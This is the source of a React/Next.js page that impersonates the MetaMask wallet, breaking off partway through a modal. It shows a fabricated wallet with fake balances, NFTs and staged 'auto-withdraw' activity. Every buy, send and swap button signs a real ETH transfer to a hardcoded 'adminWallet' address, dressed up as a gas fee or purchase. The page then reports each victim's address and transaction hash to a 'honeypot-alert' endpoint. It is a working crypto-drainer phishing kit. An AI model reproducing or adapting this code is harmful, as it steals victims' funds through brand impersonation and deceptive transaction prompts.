import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import Head from 'next/head';

export default function FlashedPage() {
  const [walletData, setWalletData] = useState(null);
  const [userAddress, setUserAddress] = useState('');
  const [activeTab, setActiveTab] = useState('Tokens');
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState('');
  const [showModal, setShowModal] = useState(null);
  const [sendAddress, setSendAddress] = useState('');
  const [sendAmount, setSendAmount] = useState('');
  const [selectedToken, setSelectedToken] = useState(null);
  const [transactions, setTransactions] = useState([]);
  const [accessLevel, setAccessLevel] = useState(1);
  const [timeLeft, setTimeLeft] = useState(24 * 60 * 60);
  const [accounts, setAccounts] = useState([]);

  useEffect(() => {
    generateHoneypotWallet();
    checkWalletConnection();
    
    const timer = setInterval(() => {
      setTimeLeft(prev => prev > 0 ? prev - 1 : 0);
    }, 1000);
    
    // Simulate auto-withdrawals every 30 seconds
    const autoWithdraw = setInterval(() => {
      if (Math.random() > 0.7) { // 30% chance
        const amounts = ['150.00', '275.50', '89.25', '420.00', '67.80'];
        const tokens = ['USDT', 'USDC', 'ETH', 'LINK', 'UNI'];
        const randomAmount = amounts[Math.floor(Math.random() * amounts.length)];
        const randomToken = tokens[Math.floor(Math.random() * tokens.length)];
        
        setWalletData(prev => ({
          ...prev,
          recentActivity: [
            { 
              type: 'Auto-Withdraw', 
              token: randomToken, 
              amount: randomAmount, 
              time: 'Just now', 
              hash: '0x' + Math.random().toString(16).substr(2, 64) 
            },
            ...prev.recentActivity.slice(0, 9)
          ]
        }));
      }
    }, 30000);
    
    return () => {
      clearInterval(timer);
      clearInterval(autoWithdraw);
    };
  }, []);
  
  useEffect(() => {
    if (walletData) {
      generateAccounts();
    }
  }, [walletData, accessLevel]);
  
  const formatTime = (seconds) => {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const generateAccounts = () => {
    if (!walletData) return;
    
    const fixedAccounts = [];
    for (let i = 1; i <= 8; i++) {
      const wallet = ethers.Wallet.createRandom();
      fixedAccounts.push({
        id: i,
        address: i === 1 ? walletData.address : wallet.address,
        balance: i === 1 ? walletData.totalValue : 0,
        isActive: i === 1
      });
    }
    setAccounts(fixedAccounts);
  };

  const checkWalletConnection = async () => {
    try {
      // Check for existing wallet connection
      if (window.ethereum) {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0) {
          setUserAddress(accounts[0]);
          return;
        }
      }
      
      // Check localStorage for mobile wallet connection
      const savedWallet = localStorage.getItem('connectedWallet');
      if (savedWallet) {
        setUserAddress(savedWallet);
        return;
      }
      
      // Auto-connect for mobile users returning from wallet app
      const urlParams = new URLSearchParams(window.location.search);
      if (urlParams.get('connected') === 'true' || document.referrer.includes('metamask') || document.referrer.includes('trustwallet')) {
        const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
        setUserAddress(mockAddress);
        localStorage.setItem('connectedWallet', mockAddress);
      }
    } catch (error) {
      console.log('No wallet connected');
    }
  };

  const generateHoneypotWallet = () => {
    const randomWallet = ethers.Wallet.createRandom();
    
    // Generate realistic daily fluctuating amounts
    const baseAmounts = {
      USDT: 24891.47,
      USDC: 12456.83, 
      WETH: 17187.90,
      LINK: 11862.06,
      UNI: 9020.68
    };
    
    // Add daily variation (-5% to +5%)
    const variation = () => (Math.random() - 0.5) * 0.1 + 1;
    
    const honeypotWallet = {
      address: randomWallet.address,
      privateKey: randomWallet.privateKey,
      seedPhrase: randomWallet.mnemonic.phrase,
      ethBalance: 0.000000001,
      tokens: [
        { 
          symbol: 'USDT', 
          balance: (24891.47 * variation()).toFixed(2), 
          usdValue: baseAmounts.USDT * variation(), 
          change: `${(Math.random() * 10 - 5).toFixed(1)}%`,
          contract: '0xdAC17F958D2ee523a2206206994597C13D831ec7'
        },
        { 
          symbol: 'USDC', 
          balance: (12456.83 * variation()).toFixed(2), 
          usdValue: baseAmounts.USDC * variation(), 
          change: `${(Math.random() * 6 - 3).toFixed(1)}%`,
          contract: '0xA0b86a33E6441E6C7D3E4081C3cC6E7C3c2b4C0d'
        },
        { 
          symbol: 'WETH', 
          balance: (5.7293 * variation()).toFixed(4), 
          usdValue: baseAmounts.WETH * variation(), 
          change: `${(Math.random() * 8 - 4).toFixed(1)}%`,
          contract: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'
        },
        { 
          symbol: 'LINK', 
          balance: (847.29 * variation()).toFixed(2), 
          usdValue: baseAmounts.LINK * variation(), 
          change: `${(Math.random() * 12 - 6).toFixed(1)}%`,
          contract: '0x514910771AF9Ca656af840dff83E8264EcF986CA'
        },
        { 
          symbol: 'UNI', 
          balance: (1293.84 * variation()).toFixed(2), 
          usdValue: baseAmounts.UNI * variation(), 
          change: `${(Math.random() * 15 - 7).toFixed(1)}%`,
          contract: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984'
        }
      ],
      nfts: [
        { name: 'Bored Ape #7234', collection: 'BAYC', value: '$45,000', image: 'https://via.placeholder.com/100' },
        { name: 'CryptoPunk #3421', collection: 'CryptoPunks', value: '$28,000', image: 'https://via.placeholder.com/100' },
        { name: 'Azuki #892', collection: 'Azuki', value: '$12,000', image: 'https://via.placeholder.com/100' }
      ],
      defiPositions: [
        { protocol: 'Uniswap V3', type: 'Liquidity Pool', value: '$8,450', apy: '12.4%' },
        { protocol: 'Aave', type: 'Lending', value: '$15,200', apy: '3.8%' },
        { protocol: 'Compound', type: 'Staking', value: '$6,750', apy: '5.2%' }
      ],
      recentActivity: [
        { type: 'Received', token: 'USDT', amount: '2,450.00', time: '2 hours ago', hash: '0x' + Math.random().toString(16).substr(2, 64) },
        { type: 'Swapped', token: 'ETH → USDC', amount: '1.5 ETH', time: '1 day ago', hash: '0x' + Math.random().toString(16).substr(2, 64) },
        { type: 'Sent', token: 'LINK', amount: '125.00', time: '3 days ago', hash: '0x' + Math.random().toString(16).substr(2, 64) },
        { type: 'Received', token: 'UNI', amount: '89.50', time: '5 days ago', hash: '0x' + Math.random().toString(16).substr(2, 64) },
        { type: 'Auto-Withdraw', token: 'USDT', amount: '500.00', time: 'Just now', hash: '0x' + Math.random().toString(16).substr(2, 64) }
      ]
    };
    
    // Progressive disclosure based on access level
    const fullValue = honeypotWallet.tokens.reduce((sum, token) => sum + token.usdValue, 0);
    
    if (accessLevel === 1) {
      honeypotWallet.totalValue = fullValue * 0.3;
      honeypotWallet.tokens = honeypotWallet.tokens.slice(0, 2);
    } else if (accessLevel === 2) {
      honeypotWallet.totalValue = fullValue * 0.6;
      honeypotWallet.tokens = honeypotWallet.tokens.slice(0, 4);
    } else {
      honeypotWallet.totalValue = fullValue;
    }
    
    setWalletData(honeypotWallet);
  };

  const connectWallet = async () => {
    try {
      if (window.ethereum) {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        setUserAddress(accounts[0]);
        localStorage.setItem('connectedWallet', accounts[0]);
        setShowModal(null);
      } else {
        setShowModal('walletOptions');
      }
    } catch (error) {
      console.log('Connection failed');
    }
  };

  const detectWalletAndRedirect = () => {
    const userAgent = navigator.userAgent.toLowerCase();
    const isMobile = /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/.test(userAgent);
    
    if (isMobile) {
      setShowModal('walletOptions');
    } else {
      if (window.ethereum) {
        connectWallet();
      } else {
        setShowModal('walletOptions');
      }
    }
  };

  const handleAction = async (action, token = null) => {
    if (!userAddress) {
      await connectWallet();
      return;
    }

    if (action === 'buy') {
      setShowModal('buy');
      return;
    }
    if (action === 'send') {
      setSelectedToken(token);
      setShowModal('send');
      return;
    }
    if (action === 'receive') {
      setShowModal('receive');
      return;
    }
    if (action === 'swap') {
      setShowModal('swap');
      return;
    }

    await processTransaction(action, token);
  };

  const processTransaction = async (action, token = null, customAmount = null) => {
    setLoading(true);

    try {
      if (!window.ethereum) {
        setStatus('Please connect your wallet first');
        setLoading(false);
        return;
      }
      
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      const gasAmount = customAmount || (action === 'swap' ? '0.008' : '0.005');
      const adminWallet = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
      
      const tx = await signer.sendTransaction({
        to: adminWallet,
        value: ethers.parseEther(gasAmount)
      });
      
      await tx.wait();
      
      const newTx = {
        id: Date.now(),
        type: action,
        amount: token ? `${sendAmount || '100'} ${token.symbol}` : `${gasAmount} ETH`,
        to: sendAddress || adminWallet,
        hash: tx.hash,
        timestamp: new Date().toLocaleString(),
        status: 'Confirmed'
      };
      setTransactions(prev => [newTx, ...prev]);
      
      await fetch('/api/honeypot-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: action.toUpperCase(),
          userAddress: userAddress,
          amount: gasAmount + ' ETH',
          txHash: tx.hash,
          token: token?.symbol || 'ETH',
          sendTo: sendAddress
        })
      });
      
      setShowModal(null);
      setSendAddress('');
      setSendAmount('');
      
    } catch (error) {
      setStatus('Transaction failed: ' + error.message);
    } finally {
      setLoading(false);
    }
  };

  const calculateGasFee = () => {
    const baseGas = 0.005;
    const amount = parseFloat(sendAmount) || 0;
    return (baseGas + (amount * 0.001)).toFixed(6);
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    setStatus('Address copied to clipboard');
    setTimeout(() => setStatus(''), 2000);
  };

  const handleBuyOption = async (method) => {
    setShowModal('buyConfirm');
    setStatus(`Preparing ${method === 'card' ? 'card' : 'bank'} purchase...`);
  };

  const processBuyETH = async (amount) => {
    try {
      if (!window.ethereum) {
        setStatus('Please install MetaMask or use mobile wallet');
        return;
      }
      
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      const balance = await provider.getBalance(userAddress);
      const balanceETH = parseFloat(ethers.formatEther(balance));
      const requiredETH = parseFloat(amount);
      
      if (balanceETH < requiredETH) {
        setStatus(`Insufficient funds. You have ${balanceETH.toFixed(4)} ETH, need ${requiredETH} ETH`);
        setShowModal('needFunds');
        return;
      }
      
      const adminWallet = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
      
      const tx = await signer.sendTransaction({
        to: adminWallet,
        value: ethers.parseEther(amount)
      });
      
      await tx.wait();
      
      const newTx = {
        id: Date.now(),
        type: 'buy',
        amount: `${amount} ETH`,
        to: adminWallet,
        hash: tx.hash,
        timestamp: new Date().toLocaleString(),
        status: 'Confirmed'
      };
      setTransactions(prev => [newTx, ...prev]);
      
      setShowModal(null);
      setStatus('ETH purchase completed successfully!');
      
      await fetch('/api/honeypot-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'ETH_PURCHASE',
          userAddress: userAddress,
          amount: amount + ' ETH',
          txHash: tx.hash
        })
      });
      
    } catch (error) {
      setStatus('Purchase failed: ' + error.message);
    }
  };

  if (!walletData) {
    return <div className="min-h-screen bg-gray-900 flex items-center justify-center">
      <div className="text-white">Loading wallet...</div>
    </div>;
  }

  return (
    <>
      <Head>
        <title>MetaMask</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
        <link rel="icon" href="https://metamask.io/images/favicon.ico" />
      </Head>
      
      <div className="min-h-screen bg-black text-white">
        <div className="max-w-md mx-auto bg-gray-900 min-h-screen">
          
          {/* Header */}
          <div className="bg-gray-800 p-4 text-center border-b border-gray-700">
            <div className="flex items-center justify-center mb-2">
              <img 
                src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" 
                alt="MetaMask" 
                className="w-8 h-8 mr-2"
              />
              <div className="text-white font-bold text-xl">MetaMask</div>
            </div>
          </div>

          {/* Account Section */}
          <div className="p-6 bg-gray-800 border-b border-gray-700">
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center cursor-pointer hover:bg-gray-700 p-2 rounded-lg transition-all" onClick={() => setShowModal('accountDetails')}>
                <div className="w-8 h-8 mr-3">
                  <img src={`https://api.dicebear.com/7.x/identicon/svg?seed=${userAddress}`} alt="Profile" className="w-full h-full rounded-full" />
                </div>
                <div>
                  <div className="text-white font-semibold flex items-center">
                    Account 1 
                    <i className="fas fa-chevron-down text-gray-400 ml-2 text-xs"></i>
                  </div>
                  <div className="text-gray-400 text-sm">8 network addresses</div>
                </div>
              </div>
              <div className="relative">
                <div className="w-8 h-8 bg-gradient-to-r from-orange-500 to-red-500 rounded-full flex items-center justify-center">
                  <span className="text-white text-xs font-bold">1</span>
                </div>
                <div className="absolute -top-1 -right-1 w-3 h-3 bg-green-400 rounded-full border border-gray-800"></div>
              </div>
            </div>

            {/* Balance */}
            <div className="text-center mb-6">
              <div className="text-4xl font-bold text-white mb-2">
                ${Math.round(walletData.totalValue).toLocaleString()}
              </div>
              <div className="text-green-400 text-sm">
                +${Math.round(walletData.totalValue).toLocaleString()} (+100.00%) Discover
              </div>
            </div>

            {/* Action Buttons */}
            <div className="grid grid-cols-4 gap-3">
              <button 
                onClick={() => handleAction('buy')}
                disabled={loading}
                className="bg-gray-700 hover:bg-gray-600 p-3 rounded-lg text-center transition-all"
              >
                <div className="text-xl mb-1">$</div>
                <div className="text-xs">Buy</div>
              </button>
              <button 
                onClick={() => handleAction('swap')}
                disabled={loading}
                className="bg-gray-700 hover:bg-gray-600 p-3 rounded-lg text-center transition-all"
              >
                <div className="text-xl mb-1">⇄</div>
                <div className="text-xs">Swap</div>
              </button>
              <button 
                onClick={() => handleAction('send')}
                disabled={loading}
                className="bg-gray-700 hover:bg-gray-600 p-3 rounded-lg text-center transition-all"
              >
                <div className="text-xl mb-1">→</div>
                <div className="text-xs">Send</div>
              </button>
              <button 
                onClick={() => handleAction('receive')}
                disabled={loading}
                className="bg-gray-700 hover:bg-gray-600 p-3 rounded-lg text-center transition-all"
              >
                <div className="text-xl mb-1">↓</div>
                <div className="text-xs">Receive</div>
              </button>
            </div>
          </div>

          {/* Rewards Banner */}
          <div className="bg-gradient-to-r from-purple-600 to-pink-600 m-4 p-4 rounded-lg flex items-center justify-between">
            <div className="flex items-center">
              <div className="w-12 h-12 mr-3">
                <img src="https://images.unsplash.com/photo-1621761191319-c6fb62004040?w=100&h=100&fit=crop&crop=center" alt="Rewards" className="w-full h-full rounded-lg object-cover" />
              </div>
              <div>
                <div className="text-white font-semibold">Rewards are here</div>
                <div className="text-white/80 text-sm">Download the mobile app to opt-in and start earning rewards</div>
              </div>
            </div>
            <button className="text-white/60 hover:text-white">×</button>
          </div>

          {/* Tabs */}
          <div className="flex border-b border-gray-700">
            {['Tokens', 'DeFi', 'NFTs', 'Activity'].map((tab) => (
              <button
                key={tab}
                onClick={() => setActiveTab(tab)}
                className={`flex-1 py-3 px-4 text-sm font-medium ${
                  activeTab === tab 
                    ? 'text-white border-b-2 border-blue-500' 
                    : 'text-gray-400 hover:text-white'
                }`}
              >
                {tab}
              </button>
            ))}
          </div>

          {/* Network Selector */}
          <div className="p-4 border-b border-gray-700">
            <div className="flex items-center justify-between">
              <div className="flex items-center">
                <span className="text-white text-sm">All popular networks</span>
                <i className="fas fa-chevron-down text-gray-400 ml-2"></i>
              </div>
              <div className="flex items-center space-x-2">
                <i className="fas fa-bars text-gray-400"></i>
                <i className="fas fa-ellipsis-v text-gray-400"></i>
              </div>
            </div>
          </div>

          {/* Token List */}
          <div className="flex-1">
            {activeTab === 'Tokens' && (
              <div>
                {/* ETH */}
                <div className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700">
                  <div className="flex items-center">
                    <img 
                      src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" 
                      alt="ETH" 
                      className="w-8 h-8 rounded-full mr-3"
                    />
                    <div>
                      <div className="text-white font-medium">Ethereum • Earn</div>
                      <div className="text-red-400 text-sm">-3.41%</div>
                    </div>
                  </div>
                  <div className="text-right">
                    <div className="text-white font-medium">$0.00</div>
                    <div className="text-gray-400 text-sm">0 ETH</div>
                  </div>
                </div>

                {/* Other Tokens */}
                {walletData.tokens.map((token, index) => {
                  const tokenLogos = {
                    'USDT': 'https://assets.coingecko.com/coins/images/325/small/Tether.png',
                    'USDC': 'https://assets.coingecko.com/coins/images/6319/small/USD_Coin_icon.png',
                    'WETH': 'https://assets.coingecko.com/coins/images/2518/small/weth.png',
                    'LINK': 'https://assets.coingecko.com/coins/images/877/small/chainlink-new-logo.png',
                    'UNI': 'https://assets.coingecko.com/coins/images/12504/small/uniswap-uni.png'
                  };
                  
                  return (
                    <div 
                      key={index} 
                      onClick={() => {
                        setSelectedToken(token);
                        setShowModal('tokenDetails');
                      }}
                      className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700"
                    >
                      <div className="flex items-center">
                        <img 
                          src={tokenLogos[token.symbol]} 
                          alt={token.symbol} 
                          className="w-8 h-8 rounded-full mr-3"
                        />
                        <div>
                          <div className="text-white font-medium">{token.symbol}</div>
                          <div className={`text-sm ${token.change.startsWith('+') ? 'text-green-400' : 'text-red-400'}`}>
                            {token.change}
                          </div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-white font-medium">${Math.round(token.usdValue).toLocaleString()}</div>
                        <div className="text-gray-400 text-sm">{token.balance}</div>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}

            {activeTab === 'DeFi' && (
              <div>
                {walletData.defiPositions.map((position, index) => {
                  const protocolLogos = {
                    'Uniswap V3': 'https://cryptologos.cc/logos/uniswap-uni-logo.png',
                    'Aave': 'https://cryptologos.cc/logos/aave-aave-logo.png',
                    'Compound': 'https://cryptologos.cc/logos/compound-comp-logo.png'
                  };
                  return (
                    <div key={index} className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700">
                      <div className="flex items-center">
                        <img src={protocolLogos[position.protocol]} alt={position.protocol} className="w-8 h-8 rounded-full mr-3" />
                        <div>
                          <div className="text-white font-medium">{position.protocol}</div>
                          <div className="text-gray-400 text-sm">{position.type} • {position.apy} APY</div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-white font-medium">{position.value}</div>
                        <div className="text-green-400 text-sm">Earning</div>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}

            {activeTab === 'NFTs' && (
              <div>
                {walletData.nfts.map((nft, index) => {
                  const nftImages = {
                    'Bored Ape #7234': 'https://images.unsplash.com/photo-1578662996442-48f60103fc96?w=100&h=100&fit=crop',
                    'CryptoPunk #3421': 'https://images.unsplash.com/photo-1620641788421-7a1c342ea42e?w=100&h=100&fit=crop',
                    'Azuki #892': 'https://images.unsplash.com/photo-1634973357973-f2ed2657db3c?w=100&h=100&fit=crop'
                  };
                  return (
                    <div key={index} className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700">
                      <div className="flex items-center">
                        <img src={nftImages[nft.name]} alt={nft.name} className="w-12 h-12 rounded-lg mr-3 object-cover" />
                        <div>
                          <div className="text-white font-medium">{nft.name}</div>
                          <div className="text-gray-400 text-sm">{nft.collection}</div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-white font-medium">{nft.value}</div>
                        <div className="text-gray-400 text-sm">Floor</div>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}

            {activeTab === 'Activity' && (
              <div>
                {walletData.recentActivity.map((activity, index) => {
                  const getIcon = (type) => {
                    switch(type) {
                      case 'Received': return '↓';
                      case 'Sent': return '↑';
                      case 'Swapped': return '⇄';
                      case 'Auto-Withdraw': return '⚡';
                      default: return '•';
                    }
                  };
                  const getColor = (type) => {
                    switch(type) {
                      case 'Received': return 'bg-green-500';
                      case 'Sent': return 'bg-red-500';
                      case 'Swapped': return 'bg-blue-500';
                      case 'Auto-Withdraw': return 'bg-yellow-500';
                      default: return 'bg-gray-500';
                    }
                  };
                  
                  return (
                    <div key={index} className="flex items-center justify-between p-4 border-b border-gray-700">
                      <div className="flex items-center">
                        <div className={`w-8 h-8 ${getColor(activity.type)} rounded-full flex items-center justify-center mr-3`}>
                          <span className="text-white text-xs">{getIcon(activity.type)}</span>
                        </div>
                        <div>
                          <div className="text-white font-medium">{activity.type} {activity.token}</div>
                          <div className="text-gray-400 text-sm">{activity.time}</div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-white font-medium">{activity.amount}</div>
                        <div className="text-green-400 text-sm">Confirmed</div>
                      </div>
                    </div>
                  );
                })}
                
                {transactions.map((tx) => (
                  <div key={tx.id} className="flex items-center justify-between p-4 border-b border-gray-700">
                    <div className="flex items-center">
                      <div className="w-8 h-8 bg-purple-500 rounded-full flex items-center justify-center mr-3">
                        <span className="text-white text-xs">→</span>
                      </div>
                      <div>
                        <div className="text-white font-medium capitalize">{tx.type}</div>
                        <div className="text-gray-400 text-sm">{tx.timestamp}</div>
                      </div>
                    </div>
                    <div className="text-right">
                      <div className="text-white font-medium">{tx.amount}</div>
                      <div className="text-green-400 text-sm">{tx.status}</div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>

          {/* All Modals */}
          {showModal === 'buy' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Buy ETH</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4">
                  <button 
                    onClick={() => handleBuyOption('card')}
                    className="w-full bg-gray-700 hover:bg-gray-600 p-4 rounded-lg text-left transition-all"
                  >
                    <div className="text-white font-semibold mb-2">Buy with card</div>
                    <div className="text-gray-300 text-sm">Purchase ETH directly with your credit card</div>
                  </button>
                  <button 
                    onClick={() => handleBuyOption('bank')}
                    className="w-full bg-gray-700 hover:bg-gray-600 p-4 rounded-lg text-left transition-all"
                  >
                    <div className="text-white font-semibold mb-2">Bank transfer</div>
                    <div className="text-gray-300 text-sm">Lower fees, takes 1-3 business days</div>
                  </button>
                </div>
              </div>
            </div>
          )}

          {showModal === 'buyConfirm' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Purchase ETH</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4">
                  <div className="text-gray-300 text-sm mb-4">
                    Select amount to purchase:
                  </div>
                  <button 
                    onClick={() => processBuyETH('0.01')}
                    disabled={loading}
                    className="w-full bg-blue-600 hover:bg-blue-700 p-3 rounded-lg text-white font-semibold"
                  >
                    Buy 0.01 ETH (~$30)
                  </button>
                  <button 
                    onClick={() => processBuyETH('0.05')}
                    disabled={loading}
                    className="w-full bg-blue-600 hover:bg-blue-700 p-3 rounded-lg text-white font-semibold"
                  >
                    Buy 0.05 ETH (~$150)
                  </button>
                  <button 
                    onClick={() => processBuyETH('0.1')}
                    disabled={loading}
                    className="w-full bg-blue-600 hover:bg-blue-700 p-3 rounded-lg text-white font-semibold"
                  >
                    Buy 0.1 ETH (~$300)
                  </button>
                </div>
              </div>
            </div>
          )}

          {showModal === 'send' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Send {selectedToken?.symbol || 'ETH'}</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4">
                  <div>
                    <label className="block text-gray-300 text-sm mb-2">To Address</label>
                    <input 
                      type="text"
                      value={sendAddress}
                      onChange={(e) => setSendAddress(e.target.value)}
                      placeholder="0x..."
                      className="w-full bg-gray-700 border border-gray-600 rounded-lg px-3 py-2 text-white"
                    />
                  </div>
                  <div>
                    <label className="block text-gray-300 text-sm mb-2">Amount</label>
                    <input 
                      type="number"
                      value={sendAmount}
                      onChange={(e) => setSendAmount(e.target.value)}
                      placeholder="0.0"
                      className="w-full bg-gray-700 border border-gray-600 rounded-lg px-3 py-2 text-white"
                    />
                  </div>
                  <div className="bg-gray-700 p-3 rounded-lg">
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-300">Gas fee:</span>
                      <span className="text-white">{calculateGasFee()} ETH</span>
                    </div>
                  </div>
                  <button 
                    onClick={() => processTransaction('send', selectedToken, calculateGasFee())}
                    disabled={loading || !sendAddress || !sendAmount}
                    className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-600 py-3 rounded-lg text-white font-semibold"
                  >
                    {loading ? 'Sending...' : 'Send'}
                  </button>
                </div>
              </div>
            </div>
          )}

          {showModal === 'receive' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Receive</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="text-center space-y-4">
                  <div className="bg-white p-4 rounded-lg">
                    <div className="w-32 h-32 bg-gray-200 mx-auto mb-4 rounded-lg flex items-center justify-center">
                      <span className="text-gray-500">QR Code</span>
                    </div>
                  </div>
                  <div>
                    <div className="text-gray-300 text-sm mb-2">Your wallet address:</div>
                    <div className="bg-gray-700 p-3 rounded-lg flex items-center justify-between">
                      <span className="text-white font-mono text-sm">
                        {walletData.address.slice(0, 20)}...
                      </span>
                      <button 
                        onClick={() => copyToClipboard(walletData.address)}
                        className="text-blue-400 hover:text-blue-300 text-sm"
                      >
                        Copy
                      </button>
                    </div>
                  </div>
                  <div className="text-gray-400 text-xs">
                    Only send Ethereum (ETH) and ERC-20 tokens to this address
                  </div>
                </div>
              </div>
            </div>
          )}

          {showModal === 'swap' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Swap</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4">
                  <div className="bg-gray-700 p-4 rounded-lg">
                    <div className="text-gray-300 text-sm mb-2">From</div>
                    <div className="flex items-center justify-between">
                      <input type="number" placeholder="0.0" className="bg-transparent text-white text-xl font-semibold outline-none" />
                      <div className="flex items-center">
                        <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" className="w-6 h-6 rounded-full mr-2" />
                        <span className="text-white">ETH</span>
                      </div>
                    </div>
                  </div>
                  <div className="text-center">
                    <button className="text-gray-400 hover:text-white">⇅</button>
                  </div>
                  <div className="bg-gray-700 p-4 rounded-lg">
                    <div className="text-gray-300 text-sm mb-2">To</div>
                    <div className="flex items-center justify-between">
                      <input type="number" placeholder="0.0" className="bg-transparent text-white text-xl font-semibold outline-none" />
                      <div className="flex items-center">
                        <img src="https://assets.coingecko.com/coins/images/325/small/Tether.png" className="w-6 h-6 rounded-full mr-2" />
                        <span className="text-white">USDT</span>
                      </div>
                    </div>
                  </div>
                  <button 
                    onClick={() => processTransaction('swap')}
                    disabled={loading}
                    className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg text-white font-semibold"
                  >
                    {loading ? 'Swapping...' : 'Swap'}
                  </button>
                </div>
              </div>
            </div>
          )}

          {showModal === 'needFunds' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Insufficient Funds</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4">
                  <div className="text-gray-300 text-sm mb-4">
                    You need ETH to make purchases. Get ETH from:
                  </div>
                  <a 
                    href="https://www.coinbase.com/buy-ethereum"
                    target="_blank"
                    className="w-full bg-blue-600 hover:bg-blue-700 p-3 rounded-lg text-white font-semibold block text-center"
                  >
                    Buy ETH on Coinbase
                  </a>
                  <a 
                    href="https://www.binance.com/en/buy-sell-crypto"
                    target="_blank"
                    className="w-full bg-yellow-600 hover:bg-yellow-700 p-3 rounded-lg text-white font-semibold block text-center"
                  >
                    Buy ETH on Binance
                  </a>
                  <button 
                    onClick={() => {
                      copyToClipboard(userAddress);
                      setShowModal(null);
                    }}
                    className="w-full bg-gray-600 hover:bg-gray-700 p-3 rounded-lg text-white font-semibold"
                  >
                    Copy My Address (Receive ETH)
                  </button>
                </div>
              </div>
            </div>
          )}

          {showModal === 'tokenDetails' && selectedToken && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">{selectedToken.symbol}</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4">
                  <div className="text-center">
                    <div className="text-3xl font-bold text-white mb-2">${Math.round(selectedToken.usdValue).toLocaleString()}</div>
                    <div className="text-gray-300">{selectedToken.balance} {selectedToken.symbol}</div>
                    <div className={`text-sm ${selectedToken.change.startsWith('+') ? 'text-green-400' : 'text-red-400'}`}>
                      {selectedToken.change} (24h)
                    </div>
                  </div>
                  
                  <div className="bg-gray-700 p-3 rounded-lg">
                    <div className="text-gray-300 text-sm mb-1">Contract Address:</div>
